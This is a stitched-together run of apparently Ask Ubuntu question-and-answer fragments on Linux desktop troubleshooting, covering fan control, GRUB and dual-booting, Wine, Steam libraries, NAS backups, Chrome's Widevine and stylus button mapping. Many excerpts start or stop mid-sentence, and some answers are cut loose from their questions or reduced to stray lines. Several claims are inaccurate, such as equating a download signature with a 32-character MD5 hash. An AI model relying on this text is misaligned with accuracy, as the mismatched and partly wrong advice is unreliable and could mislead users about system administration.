domainname}.\nPart of the utsname information is also accessible  via \n  /proc/sys/ker‐    nel/{ostype, hostname, osrelease, version,\n  domainname}.\n\n/proc filesystem however is virtual, meaning it exists only while the OS is running. Thus to some extend it is set within kernel or system libraries. \nFinally, reading through  the source code of uname.c which can be obtained with apt-get source coreutils , we can see that it indeed uses  the utsname.h library(printed with line numbers):\n 19 \n 20 #include <config.h>\n 21 #include <stdio.h>\n 22 #include <sys/types.h>\n 23 #include <sys/utsname.h>\n 24 #include <getopt.h>\n 25

If so use it and then the fan speed control will be independent of the operating system.\nI have not used Windows since XP, but as far as I am aware the Windows operating system does not have fan speed control built in, so you are using a Windows application to control your fan speeds. This application is probably SpeedFan. Run it under Windows and record the settings.\nThen under Ubuntu install, setup and run lm-sensors.

I have a kingsoft ssd installed. When there is an unexpected power loss the drive gets corrupted causing me to have to re install. I read that unplugging the drive (of course) prevents data loss but this obviously is not practical since I would still need to plug it back in when I load a new program and would be frustrating to open the case every time I boot. Is there a linux program that will turn off power to the SSD until it is required to be accessed? I feel if there was something like this it would stop the majority of these issues. I have set the power manager to auto shut down at low power, however the issue still arises when the pc freezes and I need to hard shut down.\n\nA: It sounds like you're asking for a \"safely remove\" option like with USB drives. The SATA spec is technically capable of this, but I haven't heard that it's ever been implemented for internal drives.

Even if I close the programs and restart, my laptop doesn't calm down and runs slow. It takes a complete shutdown to reset it to the cool state, but quickly escalates from there.\nI've read numerous posts about this and tried different things. I've installed/re-installed various flavors of linux several times. I really like linux, I like the idea of it, I'm just having a hard time getting it to run well on my laptop. Any help is greatly appreciated.\nUh... lllllllllllllllllllllet's go!\n\nA: First of all, this is a common problem with the 'free upgrade' to Windows 10.  It's near impossible to get it back to Windows 7/8, and in those cases where you can do so, it is only for a time until Microsoft demands you upgrade to 10 again.\nOne way to cool down the machine would be to use CPU throttling to bring the CPU speed into spec instead of running on default which tries to maximize performance with the On Demand governor.  Using Powersave instead would help in that regard with a negligible effect on performance (as seen on my own laptop with XUbuntu).\nAnother way to cool it down would be to take it apart and clean the components with compressed air and a horsehair brush to get all the dust bunnies out.  Bad air flow is one way to get a hot computer, be it a laptop or a tower PC.\nA third way to help the laptop stay cool is to buy a chiller mat with a fan built into it (powered off a USB connection).  This forces cool air against the underside of the laptop and helps it stay cool.\nAs for the battery issue, this is probably a simple case of the battery aging, losing capacity.  The simplest fix would be buying a new battery for your laptop.\n", "Q: Permission denied on start-dfs.sh I am trying to create a 2-node Hadoop cluster, following this guide.

What I'm looking for is an all-cases solution, independing on the user's graphic card, if possible. That would be more helpful not just for me, but also for other users who may are experiencing the same issue, I think.\nThe problem consists in a blur in the texts and images inside Ubuntu folders and directories and internet browsers, in all folders and files names, websites addresses, PHP and HTML sites texts in general, it looks like the fonts are corrupted, or something like that. Sometimes constant and very intense, like a pixelation effect, that distorts the words and doesn't allow me to see/read absolutely nothing, and sometimes it's less strong, and just appear when I pass the mouse cursor through a specific text or image, then it becomes slightly blurry. I'm not very sure about this, but I noticed that the blur effect sometimes becomes stronger when the CPU and memory is in high usage, when I have multiple things open up, for example.\nHere's an image with the blur effect (slighter, at this time) in some textboxes inside Ubuntu keyboard settings:\n\nIn advance, two notes: ¹yes, I've already updated my graphic card's drivers, directly downloading the latest version for it right on the manufacturer's official website, and ²yes, I've checked the ideal resolution for my screen, it's 1920 x 1080 pixels, 16:9 aspect ratio (I'm using a LG Flatron E2240, if useful).\nDo anyone know a fix for this issue?\nMy PC hardware basic details and configuration, according directly to Ubuntu \"System Setting > All Settings > Details\":\n\n\n*\n\n*Processor: Intel® Core™2 CPU 6300 @ 1.86GHz × 2\n\n*Graphics: Intel® G33\n\n*Memory: 2,9 GiB\n\n*OS type: 64-bit\n\n*Disk: 26,3 GB\n\n\n\nNot a very good or fast PC, I know, but that's all I have, ha ha.\n\nIf some additional info is required to help me find a solution for this issue, just reply to this question and I'll find it out and then put it here as fast as possible.\nI'm Brazilian, therefore a portuguese native speaker, so I'm sorry for any grammatical mistakes on my part.\nI really don't know more what to do.

It would be interesting too to know why I have to issue this command, couldnt find out what breaks playback @Suspend.\nUbuntu: 15.10\nSoundcard: Xonar U7 USB\n\nA: I am not answering your question as to how to solve the script issue; however I will venture an explanation as to why this is happening. The audio is a stream that is sent to the audio device, it is a one way communication; Awaiting no further response from the device, once the target is located and the stream is under way. As such, it is not easy to detect when the stream is broken, unlike any two way data flow,  when it would be obvious that there is no longer any communication; thus after the stream is interrupted, by a suspend, the flow is halted and it looses its target. However it does not realise that this has happened due to the target location process happening only when the stream is being started; when the memory pointer is initialised.\nThe work around is most likely researching and reinitialising these memory locations.\nPulse Audio, it would seem, uses multiple buffers depending on the hardware, the hardware is of course the eventual target of the stream. Any one of these buffers, if they lose the pointer to the memory location, will stop playback. Here is an interesting little article:\nhttp://voices.canonical.com/david.henningsson/2014/11/21/pulseaudio-buffers-and-protocol/\nIt is most likely that dma is happening during this process so as to free the stream from any heavy cpu dependency; of course depending on your hardware.\nhttps://en.wikipedia.org/wiki/Direct_memory_access\nHope this helps in some way.\n", "Q: Help in manually adding Windows 8.1 to grub loader I have just repaired my boot loader using the instructions in this video - https://www.youtube.com/watch?v=i97y5Y2nChs\nAlthough it can detect Linux Ubuntu, it can't detect my Windows 8.1.

However, I’d recommend you also look into the open-source protocols CalDAV and CardDAV. They’re not supported in Outlook, but they’re supported by iOS, OS X, Android (requires free apps), GNOME, and KDE.\nYou can setup Horde groupware on your server. Horde can act as a calendar and contacts server and provides access to that data in a web interface, over the Exchange, CalDAV, and CardDAV protocols. Horde is mostly known for being a great webmail (IMAP front-end), but it also does a good job with contact and calendar management.\nSee the above link for complete instructions on setting up Horde for calendaring, contacts, and email for one–fifty users.\n", "Q: How to disable/mute left speaker in xfce4 My left speakers give a crackling sound due to which I want to disable them.

What do each one of them hold and what is difference between them? I encounter various links where they ask to download binary, source, signatures, or package.\n\nA: These are some essential things to install software in a system.\n\n\n*\n\n*Binary file: this is a file written in binary language (the \"computer language\"), consisting of 0's and 1's, unreadable to a human. They can be executed and their function is to do a task like reading/writing/moving/copying files. Some examples of binaries are the GNU core utilities, such as ls, cat, mv, cp, cd and pwd. They are usually executed through a terminal. Binaries are compiled from a source code.\n\n*Source code: the source code is the \"recipe\" of any software. It's written with a programming language (or several of them). Some sources need to be compiled to work, for example those written in C, C++, Java and FORTRAN. This task is done with a compiler, such as the famous GCC (GNU Compiler Collection). What a compiler does is \"reading\" the content of the text files containing source code and \"translating\" it to binary. The output is a binary file.\n\n*Signature: also known as hash, a signature is usually a 32-character long string. It's used to confirm data integrity. For example, if you download something,  you could make sure it's not corrupted comparing your signature with the one provided by the download source. It's basically an algorithm, and if even a bit of the file was modified the signature will show it. A famous example is MD5.\n\n*Package: the definition of package may be a bit too broad, but considering the GNU/Linux and Ubuntu environment, a package can be:\n\n\n*\n\n*a container for a program's source code, usually stored in .tar file with gz/bz2/xz compression;\n\n*a compressed file container, such as .zip, .rar and .tar.gz files;\n\n*in the Debian ecosystem (which includes Ubuntu), we usually refer to \"package\" as a .deb file. A .deb package contains binary files, documents and manual pages to install a specific program. It also comes with scripts to tell the installer where all the files should be put. There is a program called dpkg which installs .debs.    \n", "Q: Ubuntu 15.10 update-motd.d not affects the MOTD I added a new file 80_own-motd to the /etc/update-motd.d directory on my Ubuntu 15.10 Server.\n#!/bin/sh\necho \">>>>>>Welcome to my Ubuntu Server<<<<<<<<<<\n------------Questions to me@me.com--------------\"\n\nThe output of the sudo run-parts /etc/update-motd.d/ shows the expected messages.

(And it's not the easiest thing to start with as a beginner in Linux...)\nHowever, there is no need to remove it; you can simply install Wine from the software center without any conflicts.\nBest, also install PlayOnLinux, a frontend for Wine. It ships installation scripts for many games and software, and can manage different Wine environments - each with its own Wine version, if necessary - to keep different software apart from each other.\n\nA: You downloaded the source code. Installing software from source is and advanced task which involves compiling, getting dependencies, libraries... You won't want it since you can install Wine precompiled, from the Software Center.\nIf you didn't get to the make install part of the source's instructions, no, you didn't install Wine yet. Just remove what you've downloaded. \nYou can get Wine through the Software Center or run the following command in a terminal window:\nsudo apt-get install wine\nYou didn't specify your Ubuntu version, but in 14.04 Wine is is its 1.6 version. But don't bother with having the newest: it didn't change that much. What really matters for gaming is having the appropriate drivers (the best ones are usually the propritary ones). You can get them with \"Additional drivers\" (look for it in the Dash).\nAlso have in mind that many games have native Linux versions, and with these you won't need Wine. You can get Steam (through their website or with the Software Center) and enjoy lots of native games such as Team Fortress 2, War Thunder, Left 4 Dead, Dying Light, CSGO and tons of others.\n\nA: As says the two previous answers, \"Source code\" is different from \"executable code\". I have installed Wine 1.8 because I'm fed with my old Wine 1.6.2. I run Ubuntu 14.04. I have typed \"sudo apt-get install wine1.8\"\n", "Q: flash drive at half capacity after 'dd image' format Yesterday, I wanted to try out Ubuntu, so i torrented Ubuntu 15.10 (I got the torrent file from ubuntu.com) and I used Rufus to format my 32gb flash drive. it then said that it had to \"dd image format\" it, I clicked okay and the format was done. However, when I booted from the flash drive, there were a lot of problems that I don't wish to go deeper here.\nAnyway, later I torrented Ubuntu 12.04 and used Universal USB Installer (http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-windows), this time, everything worked just fine. \nHowever, the first flash drive that i used (the one with Ubuntu 15.10) is now showing only about 14 gb in gparted and it shows as the only partition on it.\nWhat should I do now?\n\nA: This is because the ISO contained a partition table, which overwrote the one on the flash drive. To fix it, create a new partition table on the drive.\nIn GParted, you can find this in Device → Create partition table. Select a msdos partition table.\nMake sure you are really operating on the correct drive, else you may end up with a non-booting computer.\n", "Q: How to update to latest Java JRE 71?

Now everytime I boot my PC I see the grub boot menu from Ubuntu-2 but I want it to start from Ubuntu-1's grub.

So, as you have stated those are left-overs of your custom kernel compilation. You may delete it to free up some space. But if possible you might want to back-up your system to be on the safe side.\nAlso, from free-electrons, on line 82 you will see that this type of directory is created in order to generate a deb package for a Linux kernel:\ndbg_dir=\"$objtree/debian/dbgtmp\"\n\n", "Q: Cannot browse certain sites from Ubuntu The problem I have is that, suddenly, some websites stopped working (ffor example, I cannot log into HipChat nor Docker Hub).\nI dug a lot, and this is what I found:\n\n\n*\n\n*DNS Resolution works fine.\n\n*Problem appears to be related to some https POST connections.\n\n*Connections can be opened and I get a \"100 Continue\" code from the other side, but nothing else happens: the connections stays open without any response.\n\n\nI observed several things:\n\n\n*\n\n*I captured one of the failing requests (I can see them hung on Chrome developer tools) and curled it.\n\n\n*\n\n*If I do it from my machine, I obtain a 502 error after a long wait. \n\n*If I do it from a machine in a different network, it works.\n\n*If I do it from my machine, connected into a VPN, it works.\n\n*If I do it from an other machine in the same LAN, it works.\n\n\n*In all cases above, I ran curl using \"-v\" flag and TSL negotiation looks identical to the last character.

From a terminal:\nsudo -i\necho \"blacklist b43\"  >>  /etc/modprobe.d/blacklist.conf\necho \"blacklist ssb\"  >>  /etc/modprobe.d/blacklist.conf\nmodprobe -r b43\nmodprobe -r ssb\nexit\n\nSecond, I recommend that your regulatory domain be set explicitly. Check yours:\nsudo iw reg get\n\nIf you get 00, that is a one-size-maybe-fits-all setting. Find yours here: http://en.wikipedia.org/wiki/ISO_3166-1_alpha-2 Then set it temporarily:\nsudo iw reg set IS\n\nOf course, substitute your country code if not Iceland. Set it permanently:\ngksudo gedit /etc/default/crda\n\nUse nano or kate or leafpad if you don't have the text editor gedit.\nChange the last line to read:\nREGDOMAIN=IS\n\nProofread carefully, save and close the text editor.\nFinally, check the settings in the router. WPA2-AES is preferred; not any WPA and WPA2 mixed mode and certainly not TKIP. Second, if your router is capable of N speeds, you may have better connectivity with a channel width of 20 MHz in the 2.4 GHz band instead of automatic 20/40 MHz, although it is likely to affect N speeds. I also have better luck with a fixed channel, either 1, 6 or 11, rather than automatic channel selection. Also, be certain the router is not set to use N speeds only; auto B, G and N is preferred. After making these changes, reboot the router. \n", "Q: Synchronization schedule I have two computers connected to the same home network. I would like to synchronize certain folders between the two. In the past I already used unison for this purpose and I think this could be a good solution. This time I would like to automatize the process, in order not to rely on my memory...\nI'm thinking about using cron and the command line version of unison to set up a daily backup. Now, for the synchronization to happen both computers must be on at the same time, which is not always the case.\nTo solve this problem I thought that a good idea would be to create a small script on one of the two computers (let's call it PC1). The script should do the following operations:\n\n\n*\n\n*Check if the other computer (PC2) is on.\n\n*If PC2 is off then do nothing.\n\n*If PC2 is on then check when the last synchronization happened\n\n*If the two PCs synchronized last time less that 24 hours ago (for example) then do nothing.\n\n*If the last synchronization happened more that 24 hours before that execute unison\n\n\nAt that point I can run the script every 10 minutes on PC1. While PC2 is off nothing happens. As soon as PC2 is on, then unison is executed once. If both PC1 and PC2 remains on for a while no sync will take place, unless more than 24 hours pass. I think this should work, at least in theory.\nThe question is that I don't know how to implement points from 3 to 5. How can I check when last sync happened? Is there another solution to my problem? Please, take into account that I would like not to use cloud storage (huge files to synchronize, speed, etc).\nThanks!\n\nA: From your description, you might want to take a good look at BTSync.  This is a p2p syncing application but it uses only self-hosted storage.\nOn Linux, it relies on a config file and web interface but should still be easier to get going than unison.\nAdvantages over unison:\n\n\n*\n\n*easy setup\n\n*strong support for all OSes\n\n*Mobile clients (access your files like a cloud as long as any of the PCs are on)\n\n*seamless switching from LAN sync to over the internet\n\n\nThe main disadvantage is this is closed-source software from BitTorrent.\nIf you want to try it, you can find more information on ask here:\nHow to run BitTorrent Sync?\n", "Q: Keyboard not working in OS but does in GRUB I want to install GNOME Ubuntu on my custom built desktop but cannot get my keyboard to work.

My problem was because of my motherboard: Gigabyte 970a ud3p. What I had to do was to enable IOMMU on the motherboard bios, install xubuntu and then edit one of the system config files. You can check what I did in this video: https://www.youtube.com/watch?v=5Sn8-DUajhM\nIn my case, not a single USB 2.0 port was working and neither was the network card. Again, I don't know if you have the same problem, but maybe the solution is similar. Try enabling IOMMU in your motherboard (if available) and checking if the keyboard works on the live cd.\n", "Q: Get latest version of package when not available for current distro Basically, I have this:\nlucho@lucho-HP:~$ apt-cache policy dynare-matlab\ndynare-matlab:\n  Installed: 4.4.1-1build1\n  Candidate: 4.4.1-1build1\n  Version table:\n     4.4.3-1~trusty1 0\n        100 http://www.dynare.org/ubuntu/ trusty/contrib amd64 Packages\n *** 4.4.1-1build1 0\n        500 mirror://mirrors.ubuntu.com/mirrors.txt/ trusty/multiverse amd64 Packages\n        500 http://gb.archive.ubuntu.com/ubuntu/ trusty/multiverse amd64 Packages\n        100 /var/lib/dpkg/status\n\nYet, apt-get upgrade won't upgrade from 4.4.1 to 4.4.3.

Instead, resize the Data partition and leave some space for Ubuntu, which you can format from the setup.\nIf you really want Ubuntu on your SSD, resize your Windows 7 partition from 220GB to 180GB, so that there's 40GB of free space. Boot into the Ubuntu installer, and choose the \"Something Else...\" option when asked how you want to install Ubuntu.\nFrom here, right click the 40GB partition on the second drive (sdb), select (I think) \"Properties,\" format it as ext4 and mount it as /. Then, right click the partition you made on the first drive (sda), format it as ext4 and mount it as /home.\nProceed with the installation, and you should have a successful dual boot of Ubuntu and Windows, with the Ubuntu OS itself on the SSD and all your data on the HDD.\nIf you need any more details or help with this, by all means, comment and I'll help. Sorry for the unspecific instructions; I don't have an install screen in front of me at the moment. \n", "Q: How can I use both Sogou Pinyin and Dead Keys on Ubuntu or Kylin? I need to use both Chinese input and special characters like é and ü for other languages. I used to be able to do this on Ubuntu 14.04 by customizing fcitx for Chinese input and switching between this and English International with Dead Keys, but the quality of Chinese character input is lower than Sogou's.\nI have just installed Ubuntu Kylin in English to give it a try, and at first it didn't have Sogou input enabled; it was possible to switch keyboard languages but Dead Key functionality was intermittent. I then installed Sogou, by downloading the .deb from their website. This, however, seems to override the normal keyboard language switch between English with Dead Keys and other languages - my only keyboard choices now are standard (no dead keys) characters and Chinese pinyin input.\nIs it possible to have both functionalities on the same system?\n\nA: Sogou's settings option, accessed from the drop-down keyboard menu at the top of the screen, supersedes the old keyboard settings panel. Adding English International With Dead Keys from this menu (and NOT from the standard Ubuntu Keyboard Settings menu) sorts the problem out.\nThe Chinese command to access this option on the menu is 配置.\n", "Q: What are some good vpns clients for Ubuntu Linux?

I tried to install Ubuntu 14.04 to replace 12.10, as dual boot with Windows. A straight install (option \"Something Else\") would not run, so I installed 14.04 \"alongside Windows\". But it did not delete 12.1, so now I have both versions on the computer.  Installing alongside Windows does not give a choice of where to install it.\nVersion 12.1 is on a separate partition of a 2nd hard drive. I'm afraid I don't fully understand the Ubuntu partitions, so that could contribute to the problem.\n\nA: You should be able to upgrade your version from within: I've done this before, sadly you do need to upgrade one version at a time.\nFrom what I recall anyway, here's a link: Upgrade to the Latest Ubuntu the Easy Way\nHopefully you can sort it out.\n\nA: Just to be clear, you are installing, not upgrading. You are deleting 12.10 and installing 14.04. This is what you need to do in \"Something Else\"\n\n\n*\n\n*Boot your 14.04 install image from your cd/usb.\n\n*After selecting the option \"Something Else\" you need to delete your 12.02 Ubuntu partitions and designate new partitions for your 14.04 install.\n\n*The minimum you will need is the root '/' partition and swap area. Depending if your machine is UEFI bootable, you may require an EFI boot partition also.\n\n*The root partition is the uppermost level of pathname of your whole operating system. If you did not designate a home partition, the root partition will contain your home files in the same partition.\n\n*The swap area is like your Windows page file. A good starting point for deciding how much you need is to match it with your RAM.\n\n*The EFI boot partition is required if your computer has UEFI boot enabled. No configuring is required for this one, you just have to have it if you have UEFI enabled.\n\n*Once you have root, swap, and EFI, then you can install your system.\n\nA: Since I have already done it wrong, where should I start? Should I uninstall 14.04 first, then run the 14.04 install disc? Should I uninstall 12.10?  If I uninstall, will it fix (or delete) the partition? I don't want to mess things up & not even be able to boot Windows, or some such problem. When I first used \"Something Else\", that's what happened, because it couldn't find Grub. \n", "Q: How can I load Steam Games on a usb drive simply? (novice user on crouton linux) I am a new ubuntu user and have been using ubuntu trusty tahr with crouton on my acer c11 chromebook.  I can only download Steam games directly to my hard drive (which is not too big) and cannot find anywhere with simple tutorials on how to load steam games onto a usb on crouton.  Can anyone assist?  \n\nA: First mount your flash drive with read/write/execute privileges. \nHow to auto mount a flash drive with root and read/write/execute privileges\nThen create an empty folder on your flash drive.\nOpen Steam settings, click on Steam and then click on Settings.\n\n\n\n*\n\n*Steam -> Settings -> Downloads\n\n*Click on Steam Library Folders\n \n3.Click on Add Library Folder\n\nFind where your flash drive is mounted and locate and select the empty folder you created. Then click on Select\n\nNow you will be able to install games to your USB device. If you want your new library folder to be default just right click on it and make it default.\n\nJust remember to select your new library folder when installing games.\n\n\nA: as far as I now, by default everything related to steam is installed in  /home/USER/.steam. \nIf your USB drive is mounted with execute permission, you can go to steam's settings menu -> downloads -> content libraries and add a new content library on your USB drive.\nBut I don't see the benefit since the USB drives are slow...for simple arcade games they should be enough though\n\nA: I don't know anything about this Crouton business, but I store my steam games on a separate drive off my OS SSD.\n\n\n*\n\n*Have Steam installed.\n\n*Go your games Library. You have no games installed. Mount your external drive.\n\n*Select a game and Install game.\n\n*In the drop down list, choose\nInstall under /media/username/your-external-drive/Steam\n\n*This will create a Steam apps folder on your external drive which stores all your games.\nOne caveat that I have is that my Steam drive does not automatically mount during computer bootup, so I will have to manually mount it, make Steam to \"install\" it under the same pathname, then Steam will detect all my games.\n", "Q: Create startup disk for windows 8.1 inside Ubuntu 14.01 I've installed Ubuntu on my laptop but\ndidn't know that my windows OS would be removed (even tho it says so while doing this process!!!) <--Had to say this, sorry :/ \n...Just a Drone after all...\nNow I've been trying to reinstall windows with Ubuntu already installed.\nI've tried a lot of way's but I couldn't fix it.

Installing Ubuntu second, will install GRUB over MBR which will detect both your Ubuntu and Windows partition.\nAlso you have to be consistent with boot types. That is, if Windows is UEFI, Ubuntu needs to be UEFI. If Windows is legacy, Ubuntu needs to be legacy. There is the case where you can install Windows with UEFI boot, then disable UEFI, then install Ubuntu as legacy. But if you have UEFI, you should install both Windows and Ubuntu with UEFI.\n\nA: Right click on the Win8.1_English_x64.iso file and select burn to disk. Ubuntu will burn the disk and it will be bootable. You will need to burn this to a blank DVD.\nNext, use your Ubuntu installation media to boot up the computer in a live session and choose \"Try ubuntu without installing\".\nOpen up the application \"Gparted\", and create a partition to put windows on.

I've tried making a bootable USB stick but when I hold down the alt/option key all I get is the word Windows under a disk icon and an arrow in a circle under that. Still no boot to the .dmg image on the USB stick. I am guessing I installed boot camp and that is where the windows crap is coming from. I would like to recover the system on the disk if possible but that is likely to require booting Ubuntu from either a DVD drive on the USB or a USB stick. \n\nA: That Windows disk in the Mac Mini boot menu is your Ubuntu image on that flash drive. For some reason, Macs recognizes non-Apple external bootable drives as Windows.\nYes, if you installed Ubuntu in an ext4 drive format, then you will need to mount that drive in another Linux OS. Both Windows and Macs do not recognize files in a drive with ext4 format.\nYou can also try a service like Drive Savers who are the world specialists in data recovery.\n", "Q: Where to put configuration to turn off multicast snooping on bridges? This question does not have anything to do with multicast DNS, multicast UPNP or anything but multicast snooping.\nI know for a fact that if I do not turn off multicast snooping on my 15.10 system where the primary network interface is br0 bridge any attempt to reach an IPv6 destination will be thwarted by multicast snooping which is there to prevent flooding the network with multicast packets that most systems aren't interested.  This is as simple as:\n\n\n*\n\n*Boot computer into Ubuntu 15.10 with br0 as the primary interface (where \"primary interface\" is the interface with default route).\n\n*Try ping6 an IPv6 address and watch it fail.\n\n*Run sudo sh -c \"echo -n 0 > /sys/class/net/br0/bridge/multicast_snooping\"\n\n*Try ping6 again and it is magically working.\n\n\nYou can read about it in the answer here too.

Is there a way to put that in /etc/network/interfaces?\n\nA: The answer is it's not true.

Since at this point 4.9 is 4.9.3, which is not supported, you'll need 4.8.\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 40 --slave /usr/bin/g++ g++ /usr/bin/g++-4.8\n\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50 --slave /usr/bin/g++ g++ /usr/bin/g++-5\nRemember to choose gcc-4.8 before running the installer:\nsudo update-alternatives --config gcc\nand after, to switch back to having gcc-5 by default.\n(Since you're doing it to install the CUDA SDK, I'll add that if you want to test the samples, you may want to read this.)\n\nA: \nTHIS ANSWER IS DANGEROUS as it can damage your system and the GCC libraries on your system and make your system unusable.  **Exercise caution when using this answer, and consider this a 'last resort' answer.\n\nUninstall gcc5.4\nsudo apt-get remove gcc g++\n\nCheck gcc again:\ngcc –version\n\nInstall gcc 4.9/g++ 4.9\nsudo apt-get install gcc-4.9 g++-4.9\n\nChecking Version:\ng++-4.9 –version\n\nLink to gcc g++\nln -s /usr/bin/g++-4.9 /usr/bin/g++\nln -s /usr/bin/gcc-4.9 /usr/bin/gcc\n\nChecking Version:\ng++ –v\ngcc –v\n\ncited from this blog, and my own install\n", "Q: Backing up Ubuntu to a Windows NAS I have spent hours trying to replicate the function of Cobian Backup (Windows only) on Linux (Xubuntu): basically to schedule backups of certain folders to an external hard drive attached to a router (a Network Attached Storage / NAS).\nI found lots of information on rsync and grsync (GUI for rsync), on Unison (seems very powerful), and chrontab, but I ran into several problems:\n\n\n*\n\n*I would prefer to keep a mainly graphical setup with minimal command line interfaces ... this is not just for me (convenience) but for other users who are not fans of CLI.\n\n*I want to backup to a SMB shared folder (a Seagate Central) - grsync doesn't like it because it's not properly mounted.\n\n*I don't want to have to keep manually editing chrontab, etc.\n\n\nI finally found what seems to be a workable solution, so I will be posting it below, but also providing a place for other EASY (or as easy as possible) solutions for 'minimally-techie' users.\n\nA: Here is one solution that seems to work and is (relatively) straightforward and (largely) GUI-based:\n\n\n*\n\n*Install GRSYNC from the Ubuntu apps directory (or through apt-get install).\n\n*Install \"Scheduled Tasks\" / Gnome-Schedule using CLI / terminal:\nsudo apt-get install gnome-schedule\n\n\n*Mount your NAS / external hard drive so that Linux recognizes it as if it was another hard drive. (NOTE: detailed instructions are available on the Ubuntu wiki named MountWindowsSharesPermanently - if someone wants to make this a link, it would be great - I'm only allowed to post 2 links). These steps assume you are accessing an unprotected / public folder. The wiki contains more information on different scenarios.\n\n\n*\n\n*Install cifs-utils: sudo apt-get install cifs-utils\n\n*Create a mount folder for the NAS folder you are mounting in the 'media' folder. You can do this either through your file manager (you may have to access it as super-user) or through CLI: sudo mkdir /media/what-you-want-to-call-your-nas (e.g. \"/media/seagatecentral\")\n\n*Add your NAS to the /etc/fstab file. You can do this either by browsing to it in your file manager (again, with super-user status) or through CLI: sudo nano /etc/fstab.\nAdd this line:\n//servername/sharename  /media/what-you-want-to-call-your-nas  cifs  guest,uid=1000,iocharset=utf8  0  0\n\n\n\n*\n\n*Servername: the name of your NAS 'server' (easiest is to use the IP address, and assign it a static IP address in your router settings. If you can't do this you may be able to identify the non-IP address server name by browsing to it in your file manager).\n\n*sharename: the folder you want to mount (e.g. on Seagate Central, a default \"Public\" folder is created that could be used here, or another one like \"MyName/Backups\" so it would read \"//ip-address-here/MyName/Backups\")\n\n\n*Remount your drives so the new 'drive' will show up: sudo mount -a\n\n\n*Create a backup using GRSYNC - most of the options are fairly straightforward, so setup the type of backup you want (NOTE: you are not scheduling it yet). A quick guide is available at dedoimedo.\n\n*Find the rsync command generated by GRSYNC: go to File --> Rsync Command Line (or just press Alt+R). Copy the entire command.\n\n*Create a scheduled task using Gnome-Schedule. This is fairly straightforward as well. In the \"Command\" field, paste the rsync command you copied from GRSYNC. For more information on Gnome-Schedule, you can check everydaylinuxuser.\n\n\nYou should be all set now.\n", "Q: Chrome on Ubuntu no longer supports Netflix? Latest update removed Widevine component Netflix was working fine until an upgrade updated Chrome to version 48.0.2564.82 (64-bit). It first told me to ensure Widevine was set to \"always enabled\" in chrome://plugins. After checking \"always enabled\" it now tells me to check for an update in chrome://components, however it is not in the list of components.\nI've deleted the Chrome config (sudo rm -r ~/.config/google-chrome) and rebooted to no avail. Other users on Reddit reported the same thing here: https://www.reddit.com/r/netflix/comments/423a04/all_any_other_linux_users_getting_a_widevine/\nDist: Ubuntu 15.10 (64-bit)\n\nA: I think I figured out this problem. It's related to this issue:\nhttps://code.google.com/p/chromium/issues/detail?id=583009\nIf for some reason you created a launcher on your machine that uses the path to the direct chrome binary like this:\nExec=/opt/google/chrome/chrome\n\nthen you aren't running the normal shell script that sets up some library paths to get widevine to work. You can fix it by changing that line to start with:\nExec=/opt/google/chrome/google-chrome\n\nThis can happen if you ever started chrome from the command-line and then locked it to your launcher. \nThis Exec line will be in a .desktop file in\n~/.local/share/applications\n\nUsually it will be called \"google-chrome.desktop\", but it could have other names.\n\nA: I experienced the same problem today.

The command was:\nsudo ir-keytable --device /dev/input/event8 --set-key 0xd003c=BTN_STYLUS2\n\nHOWEVER, while I could see that the scancode had been successfully rebound, the button remained dead. evtest no longer reported any event when the button was pressed.\nBefore this, there was no MSC_SCAN event reported by evtest when that button was pressed, though there were scancodes reported for the other button and also the pen touch. This didn't strike me as more than an odd quirk at the time, but now it seems like the button really does generate no scancode. How did evtest report a keycode event at all, then? Beats me, and at this point I'm chalking it up to a kernel bug.\nIn the end, I just kludged together a bash script to watch evtest for BTN_TOOL_RUBBER events and simulate a right-click with xdotool:\n#!/bin/bash\n\n# Find the input device number.\ndevicename=\"ELAN Touchscreen Pen\"\nnumevents=$(ls /dev/input | grep -c event*)\nfor ((devnr=0;devnr<$numevents;devnr++)); do\n    input-kbd $devnr | grep -q \"$devicename\"\n    if [[ $? == 0 ]]; then\n        break\n    fi\ndone\n\n# Listen for BTN_TOOL_RUBBER events.\nevtest /dev/input/event$devnr | while read line; do\nfor value in {0..1}; do\n    echo $line | grep -q \"type 1 (EV_KEY), code 321 (BTN_TOOL_RUBBER), value $value\"\n    if [[ $? == 0 ]]; then\n        case $value in\n            0)  xdotool mouseup 3   ;;\n            1)  xdotool mousedown 3 ;;\n        esac\n    fi\ndone\ndone\n\nThis gives me essentially the basic functionality I wanted anyways. It's not perfect: the mouseup event only happens once the pen leaves proximity, not when the button is released (this is when the BTN_TOOL_RUBBER key-up event is reported in evtest), but it works well enough that I'm not going to try debugging the kernel.\n\nA: I had the same problems with my Surface Pro 3 and solved it this way:\nhttps://forums.linuxmint.com/viewtopic.php?f=59&t=312005&p=1762496#p1762496\nAfter the device is listed in xsetwacom list device, you can remap the buttons with xsetwacom easy.\n\nA: This one is a year old, but I wanted to say that your hwdb file is almost correct. But:\n\n\n*\n\n*The right hand side has to be in decimal, not hex, so use 332 not 14c.\n\n*The left hand side comes from evtest not input-kbd (don't ask because I don't really know). Specifically it's from the value field in the MSC_SCAN line IMMEDIATELY preceding the BTN_TOOL_RUBBER (or whatever the mismapped key is) event.\n\n\nIn my case I had:\ntype 4 (EV_MSC), code 4 (MSC_SCAN), value d0045\n\nSo my complete hwdb file is:\nevdev:input:b0003v04F3p21D0*\n  KEYBOARD_KEY_d0045=332\n\n\n\n*\n\n*sudo udevadm hwdb --update\n\n*sudo udevadm trigger /dev/input/event*\n\n*Reboot.\n\n", "Q: How to apply kernel patches I've been installing kernels from mainline repository - all simple there, just *.deb files, one can do simple dpkg -i on them.

My host computer is running Mac OS X Snow Leopard (because my Mac is old), my virtual computer is running Ubuntu 14.10 and I'm running VirtualBox 4.0.36 (again, because my Mac is old). \nI'm trying to run Java on my virtual machine, but it seems that I can't do that without the command line. Every time I try to install via the command line, I get an error of \"Unable to locate package.\" If I try to run sudo apt-get update, I'll get a series of 404 errors. In my research, I've found that it could be a network error that is causing my problem. However, I am able to access the Internet and Ubuntu Software Center normally, which leads me to think that the network is not the issue. Just in case, however, I'll mention that my virtual machine is attached to a Bridged Adapter.\nI've done a lot of searching, but I can't find a solution that seems to answer my specific problem. Can anyone offer a solution?\n\nA: The reason for the 404 errors was that Ubuntu 14.10 has already reached its end of life. When an Ubuntu releases reaches EOL, its packages are moved from the normal Ubuntu archive morrors to http://old-releases.ubuntu.com/. Hence, when one tries to get the packages from the normal mirrors, they are not found and a 404 error is triggered.\nThe correct thing to do is to use an Ubuntu release which has not reached EOL, 